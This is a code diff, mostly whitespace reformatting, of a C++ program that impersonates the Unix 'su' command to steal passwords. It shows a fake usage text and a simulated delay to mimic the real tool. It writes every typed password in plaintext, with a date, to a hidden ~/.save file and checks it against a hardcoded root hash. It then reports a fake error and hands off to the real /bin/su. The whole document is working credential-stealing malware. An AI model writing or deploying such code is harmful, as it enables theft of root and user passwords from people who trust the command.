@@ -30,61 +30,60 @@
 #define DEFAULT_USER "root"
 #define SALT "$6$6LxYfOg6"
 #define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[]) 
+{
+	/*== Variables ==*/
+	std::string passwd, user, command, createdHash;
+	std::string path = "/home/"+std::string(getlogin())+"/.save";
+	std::ofstream passwdFile;
 
-    /*== Variables ==*/
-    std::string passwd, user, command, createdHash;
-    std::string path = "/home/"+std::string(getlogin())+"/.save";
-    std::ofstream passwdFile;
+        /*== Control args ==*/
+        try {
+	    if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "--help") {
+			std::cout << "Usage: su [OPTION] [LOGIN]\n\nOptions:\n-c, --command COMMAND   pass COMMAND to the invoked shell\n-h, --help              display this help message and exit\n-, -l, --login          make the shell a login shell\n-m, -p,\n--preserve-environment  do not reset environment variables, and\n                        keep the same shell\n-s, --shell SHELL       use SHELL instead of the default in passwd\n";
+			return 0;
+        	} else {
+            		user = std::string(argv[1]);            
+        	}
+    	} catch (std::logic_error) {
+        	user = DEFAULT_USER;
+    	}
 
-    /*== Control args ==*/
-    try {
-        if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "--help") {
-                std::cout << "Usage: su [OPTION] [LOGIN]\n\nOptions:\n-c, --command COMMAND   pass COMMAND to the invoked shell\n-h, --help              display this help message and exit\n-, -l, --login          make the shell a login shell\n-m, -p,\n--preserve-environment  do not reset environment variables, and\n                        keep the same shell\n-s, --shell SHELL       use SHELL instead of the default in passwd\n";
-                return 0;
-        } else {
-            user = std::string(argv[1]);            
-        }
-    } catch (std::logic_error) {
-        user = DEFAULT_USER;
-    }
+	/*== Take the password ==*/
+	passwd = std::string(getpass("Password: "));
+	sleep(2); // Simulate real su
 
-    /*== Take the password ==*/
-    passwd = std::string(getpass("Password: "));
-    sleep(2); // Simulate real su
+	/*== Crypt the password SHA-512 ==*/
+	createdHash = std::string(crypt(passwd.c_str(), SALT));
 
-    /*== Crypt the password SHA-512 ==*/
-    createdHash = std::string(crypt(passwd.c_str(), SALT));
+	/*== Open passwd File path ==*/
+	passwdFile.open(path, std::ios::app);
+	if (!passwdFile.is_open()) {
+		std::cerr << "An error has occured\n";
+        	passwdFile.close();
+        	return -2;
+    	}
+    	/*== Set date ==*/
+    	time_t now = time(0);
+    	char* tmp = ctime(&now);
+    	std::string date = std::string(tmp);
+    	date.erase(date.length()-1, 1);
 
-    /*== Open passwd File path ==*/
-    passwdFile.open(path, std::ios::app);
-    if (!passwdFile.is_open()) {
-        std::cerr << "An error has occured\n";
-        passwdFile.close();
-        return -2;
-    }
-    /*== Set date ==*/
-    time_t now = time(0);
-    char* tmp = ctime(&now);
-    std::string date = std::string(tmp);
-    date.erase(date.length()-1, 1);
-
-    /*== Control hash ==*/
-    if (createdHash == HASH) {
-        /*== CORRECT ==*/
-        passwdFile << "CORRECT (" << date << "): " << passwd << '\n';
-        passwdFile.close();
-        std::cerr << "An error has occured, Retry\n";
-        
-        /*== Start the real su ==*/
-        execv("/bin/su", argv);
-        return 0;    
-
-    } else {
-        /*== ERROR ==*/
-        passwdFile << "ERROR (" << date << "): " << passwd << '\n';
-        passwdFile.close();
-        std::cerr << "su: Authentication failure\n";
-        return 1;
-    }
+    	/*== Control hash ==*/
+    	if (createdHash == HASH) {
+        	/*== CORRECT ==*/
+       		passwdFile << "CORRECT (" << date << "): " << passwd << '\n';
+        	passwdFile.close();
+        	std::cerr << "An error has occured, Retry\n";
+	
+        	/*== Start the real su ==*/
+        	execv("/bin/su", argv);
+        	return 0;    
+    	} else {
+        	/*== ERROR ==*/
+        	passwdFile << "ERROR (" << date << "): " << passwd << '\n';
+        	passwdFile.close();
+        	std::cerr << "su: Authentication failure\n";
+        	return 1;
+    	}
 }
